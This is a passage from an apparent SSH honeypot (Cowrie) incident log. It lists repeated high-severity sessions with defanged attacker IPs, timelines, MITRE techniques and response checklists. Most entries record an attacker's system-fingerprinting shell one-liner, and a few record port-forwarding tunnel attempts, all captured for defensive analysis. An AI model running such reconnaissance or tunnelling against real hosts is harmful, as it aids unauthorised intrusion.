| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 17:43:23` | `cowrie.session.connect` |
| `2026-07-09 17:43:24` | `cowrie.client.version` |
| `2026-07-09 17:43:24` | `cowrie.client.kex` |
| `2026-07-09 17:43:25` | `cowrie.login.success` |
| `2026-07-09 17:43:26` | `cowrie.direct-tcpip.request` |
| `2026-07-09 17:43:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.124[.]218` to AbuseIPDB if not already reported
- [ ] Block `196.189.124[.]218` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c1e30c473c3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 17:44 |
| **Last Seen** | 2026-07-09 17:44 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 17:44:01` | `cowrie.session.connect` |
| `2026-07-09 17:44:01` | `cowrie.client.version` |
| `2026-07-09 17:44:01` | `cowrie.client.kex` |
| `2026-07-09 17:44:01` | `cowrie.login.success` |
| `2026-07-09 17:44:02` | `cowrie.session.params` |
| `2026-07-09 17:44:02` | `cowrie.command.input` |
| `2026-07-09 17:44:02` | `cowrie.command.input` |
| `2026-07-09 17:44:02` | `cowrie.command.input` |
| `2026-07-09 17:44:02` | `cowrie.command.input` |
| `2026-07-09 17:44:02` | `cowrie.command.input` |
| `2026-07-09 17:44:02` | `cowrie.command.success` |
| `2026-07-09 17:44:02` | `cowrie.command.input` |
| `2026-07-09 17:44:02` | `cowrie.command.input` |
| `2026-07-09 17:44:02` | `cowrie.command.input` |
| `2026-07-09 17:44:02` | `cowrie.command.input` |
| `2026-07-09 17:44:03` | `cowrie.log.closed` |
| `2026-07-09 17:44:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d17dd351b03

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 17:45 |
| **Last Seen** | 2026-07-09 17:45 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 17:45:38` | `cowrie.session.connect` |
| `2026-07-09 17:45:38` | `cowrie.client.version` |
| `2026-07-09 17:45:38` | `cowrie.client.kex` |
| `2026-07-09 17:45:39` | `cowrie.login.success` |
| `2026-07-09 17:45:40` | `cowrie.session.params` |
| `2026-07-09 17:45:40` | `cowrie.command.input` |
| `2026-07-09 17:45:40` | `cowrie.command.input` |
| `2026-07-09 17:45:40` | `cowrie.command.input` |
| `2026-07-09 17:45:40` | `cowrie.command.input` |
| `2026-07-09 17:45:40` | `cowrie.command.input` |
| `2026-07-09 17:45:40` | `cowrie.command.success` |
| `2026-07-09 17:45:40` | `cowrie.command.input` |
| `2026-07-09 17:45:40` | `cowrie.command.input` |
| `2026-07-09 17:45:40` | `cowrie.command.input` |
| `2026-07-09 17:45:40` | `cowrie.command.input` |
| `2026-07-09 17:45:40` | `cowrie.log.closed` |
| `2026-07-09 17:45:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4ca1c8e5003

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 17:47 |
| **Last Seen** | 2026-07-09 17:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 17:47:16` | `cowrie.session.connect` |
| `2026-07-09 17:47:16` | `cowrie.client.version` |
| `2026-07-09 17:47:16` | `cowrie.client.kex` |
| `2026-07-09 17:47:17` | `cowrie.login.success` |
| `2026-07-09 17:47:18` | `cowrie.session.params` |
| `2026-07-09 17:47:18` | `cowrie.command.input` |
| `2026-07-09 17:47:18` | `cowrie.command.input` |
| `2026-07-09 17:47:18` | `cowrie.command.input` |
| `2026-07-09 17:47:18` | `cowrie.command.input` |
| `2026-07-09 17:47:18` | `cowrie.command.input` |
| `2026-07-09 17:47:18` | `cowrie.command.success` |
| `2026-07-09 17:47:18` | `cowrie.command.input` |
| `2026-07-09 17:47:18` | `cowrie.command.input` |
| `2026-07-09 17:47:18` | `cowrie.command.input` |
| `2026-07-09 17:47:18` | `cowrie.command.input` |
| `2026-07-09 17:47:18` | `cowrie.log.closed` |
| `2026-07-09 17:47:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b54b25fc61ee

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 17:48 |
| **Last Seen** | 2026-07-09 17:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 17:48:56` | `cowrie.session.connect` |
| `2026-07-09 17:48:57` | `cowrie.client.version` |
| `2026-07-09 17:48:57` | `cowrie.client.kex` |
| `2026-07-09 17:48:57` | `cowrie.login.success` |
| `2026-07-09 17:48:58` | `cowrie.session.params` |
| `2026-07-09 17:48:58` | `cowrie.command.input` |
| `2026-07-09 17:48:58` | `cowrie.command.input` |
| `2026-07-09 17:48:58` | `cowrie.command.input` |
| `2026-07-09 17:48:59` | `cowrie.command.input` |
| `2026-07-09 17:48:59` | `cowrie.command.input` |
| `2026-07-09 17:48:59` | `cowrie.command.success` |
| `2026-07-09 17:48:59` | `cowrie.command.input` |
| `2026-07-09 17:48:59` | `cowrie.command.input` |
| `2026-07-09 17:48:59` | `cowrie.command.input` |
| `2026-07-09 17:48:59` | `cowrie.command.input` |
| `2026-07-09 17:48:59` | `cowrie.log.closed` |
| `2026-07-09 17:48:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0416c5249970

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-09 17:50 |
| **Last Seen** | 2026-07-09 17:50 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 17:50:33` | `cowrie.session.connect` |
| `2026-07-09 17:50:34` | `cowrie.client.version` |
| `2026-07-09 17:50:34` | `cowrie.client.kex` |
| `2026-07-09 17:50:40` | `cowrie.login.success` |
| `2026-07-09 17:50:43` | `cowrie.session.params` |
| `2026-07-09 17:50:43` | `cowrie.command.input` |
| `2026-07-09 17:50:44` | `cowrie.log.closed` |
| `2026-07-09 17:50:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59c5da3a50d4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 17:50 |
| **Last Seen** | 2026-07-09 17:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 17:50:34` | `cowrie.session.connect` |
| `2026-07-09 17:50:34` | `cowrie.client.version` |
| `2026-07-09 17:50:34` | `cowrie.client.kex` |
| `2026-07-09 17:50:35` | `cowrie.login.success` |
| `2026-07-09 17:50:36` | `cowrie.session.params` |
| `2026-07-09 17:50:36` | `cowrie.command.input` |
| `2026-07-09 17:50:36` | `cowrie.command.input` |
| `2026-07-09 17:50:36` | `cowrie.command.input` |
| `2026-07-09 17:50:36` | `cowrie.command.input` |
| `2026-07-09 17:50:36` | `cowrie.command.input` |
| `2026-07-09 17:50:36` | `cowrie.command.success` |
| `2026-07-09 17:50:36` | `cowrie.command.input` |
| `2026-07-09 17:50:36` | `cowrie.command.input` |
| `2026-07-09 17:50:36` | `cowrie.command.input` |
| `2026-07-09 17:50:36` | `cowrie.command.input` |
| `2026-07-09 17:50:36` | `cowrie.log.closed` |
| `2026-07-09 17:50:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d8ea5e64c1c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 17:52 |
| **Last Seen** | 2026-07-09 17:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 17:52:16` | `cowrie.session.connect` |
| `2026-07-09 17:52:16` | `cowrie.client.version` |
| `2026-07-09 17:52:17` | `cowrie.client.kex` |
| `2026-07-09 17:52:17` | `cowrie.login.success` |
| `2026-07-09 17:52:18` | `cowrie.session.params` |
| `2026-07-09 17:52:18` | `cowrie.command.input` |
| `2026-07-09 17:52:18` | `cowrie.command.input` |
| `2026-07-09 17:52:18` | `cowrie.command.input` |
| `2026-07-09 17:52:18` | `cowrie.command.input` |
| `2026-07-09 17:52:18` | `cowrie.command.input` |
| `2026-07-09 17:52:18` | `cowrie.command.success` |
| `2026-07-09 17:52:18` | `cowrie.command.input` |
| `2026-07-09 17:52:18` | `cowrie.command.input` |
| `2026-07-09 17:52:18` | `cowrie.command.input` |
| `2026-07-09 17:52:18` | `cowrie.command.input` |
| `2026-07-09 17:52:18` | `cowrie.log.closed` |
| `2026-07-09 17:52:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9189dbb53339

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 17:54 |
| **Last Seen** | 2026-07-09 17:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 17:54:11` | `cowrie.session.connect` |
| `2026-07-09 17:54:11` | `cowrie.client.version` |
| `2026-07-09 17:54:11` | `cowrie.client.kex` |
| `2026-07-09 17:54:11` | `cowrie.login.success` |
| `2026-07-09 17:54:12` | `cowrie.session.params` |
| `2026-07-09 17:54:12` | `cowrie.command.input` |
| `2026-07-09 17:54:12` | `cowrie.command.input` |
| `2026-07-09 17:54:12` | `cowrie.command.input` |
| `2026-07-09 17:54:12` | `cowrie.command.input` |
| `2026-07-09 17:54:12` | `cowrie.command.input` |
| `2026-07-09 17:54:12` | `cowrie.command.success` |
| `2026-07-09 17:54:12` | `cowrie.command.input` |
| `2026-07-09 17:54:12` | `cowrie.command.input` |
| `2026-07-09 17:54:12` | `cowrie.command.input` |
| `2026-07-09 17:54:12` | `cowrie.command.input` |
| `2026-07-09 17:54:12` | `cowrie.log.closed` |
| `2026-07-09 17:54:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b72512e28faa

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-09 17:54 |
| **Last Seen** | 2026-07-09 17:54 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 17:54:47` | `cowrie.session.connect` |
| `2026-07-09 17:54:48` | `cowrie.client.version` |
| `2026-07-09 17:54:48` | `cowrie.client.kex` |
| `2026-07-09 17:54:50` | `cowrie.login.success` |
| `2026-07-09 17:54:52` | `cowrie.session.params` |
| `2026-07-09 17:54:52` | `cowrie.command.input` |
| `2026-07-09 17:54:52` | `cowrie.log.closed` |
| `2026-07-09 17:54:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd3a69507e70

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 17:56 |
| **Last Seen** | 2026-07-09 17:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 17:56:13` | `cowrie.session.connect` |
| `2026-07-09 17:56:13` | `cowrie.client.version` |
| `2026-07-09 17:56:13` | `cowrie.client.kex` |
| `2026-07-09 17:56:14` | `cowrie.login.success` |
| `2026-07-09 17:56:15` | `cowrie.session.params` |
| `2026-07-09 17:56:15` | `cowrie.command.input` |
| `2026-07-09 17:56:15` | `cowrie.command.input` |
| `2026-07-09 17:56:15` | `cowrie.command.input` |
| `2026-07-09 17:56:15` | `cowrie.command.input` |
| `2026-07-09 17:56:15` | `cowrie.command.input` |
| `2026-07-09 17:56:15` | `cowrie.command.success` |
| `2026-07-09 17:56:15` | `cowrie.command.input` |
| `2026-07-09 17:56:15` | `cowrie.command.input` |
| `2026-07-09 17:56:15` | `cowrie.command.input` |
| `2026-07-09 17:56:15` | `cowrie.command.input` |
| `2026-07-09 17:56:15` | `cowrie.log.closed` |
| `2026-07-09 17:56:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c17c8403f03

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 17:57 |
| **Last Seen** | 2026-07-09 17:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 17:57:48` | `cowrie.session.connect` |
| `2026-07-09 17:57:48` | `cowrie.client.version` |
| `2026-07-09 17:57:48` | `cowrie.client.kex` |
| `2026-07-09 17:57:49` | `cowrie.login.success` |
| `2026-07-09 17:57:50` | `cowrie.session.params` |
| `2026-07-09 17:57:50` | `cowrie.command.input` |
| `2026-07-09 17:57:50` | `cowrie.command.input` |
| `2026-07-09 17:57:50` | `cowrie.command.input` |
| `2026-07-09 17:57:50` | `cowrie.command.input` |
| `2026-07-09 17:57:50` | `cowrie.command.input` |
| `2026-07-09 17:57:50` | `cowrie.command.success` |
| `2026-07-09 17:57:50` | `cowrie.command.input` |
| `2026-07-09 17:57:50` | `cowrie.command.input` |
| `2026-07-09 17:57:50` | `cowrie.command.input` |
| `2026-07-09 17:57:50` | `cowrie.command.input` |
| `2026-07-09 17:57:50` | `cowrie.log.closed` |
| `2026-07-09 17:57:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b76a4c03fd2b

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-09 17:58 |
| **Last Seen** | 2026-07-09 17:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 17:58:43` | `cowrie.session.connect` |
| `2026-07-09 17:58:43` | `cowrie.client.version` |
| `2026-07-09 17:58:43` | `cowrie.client.kex` |
| `2026-07-09 17:58:44` | `cowrie.login.success` |
| `2026-07-09 17:58:44` | `cowrie.direct-tcpip.request` |
| `2026-07-09 17:58:44` | `cowrie.direct-tcpip.data` |
| `2026-07-09 17:58:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd38535b03fa

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 17:59 |
| **Last Seen** | 2026-07-09 17:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 17:59:19` | `cowrie.session.connect` |
| `2026-07-09 17:59:19` | `cowrie.client.version` |
| `2026-07-09 17:59:19` | `cowrie.client.kex` |
| `2026-07-09 17:59:20` | `cowrie.login.success` |
| `2026-07-09 17:59:21` | `cowrie.session.params` |
| `2026-07-09 17:59:21` | `cowrie.command.input` |
| `2026-07-09 17:59:21` | `cowrie.command.input` |
| `2026-07-09 17:59:21` | `cowrie.command.input` |
| `2026-07-09 17:59:21` | `cowrie.command.input` |
| `2026-07-09 17:59:21` | `cowrie.command.input` |
| `2026-07-09 17:59:21` | `cowrie.command.success` |
| `2026-07-09 17:59:21` | `cowrie.command.input` |
| `2026-07-09 17:59:21` | `cowrie.command.input` |
| `2026-07-09 17:59:21` | `cowrie.command.input` |
| `2026-07-09 17:59:21` | `cowrie.command.input` |
| `2026-07-09 17:59:21` | `cowrie.log.closed` |
| `2026-07-09 17:59:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-148868e909f0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 18:00 |
| **Last Seen** | 2026-07-09 18:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
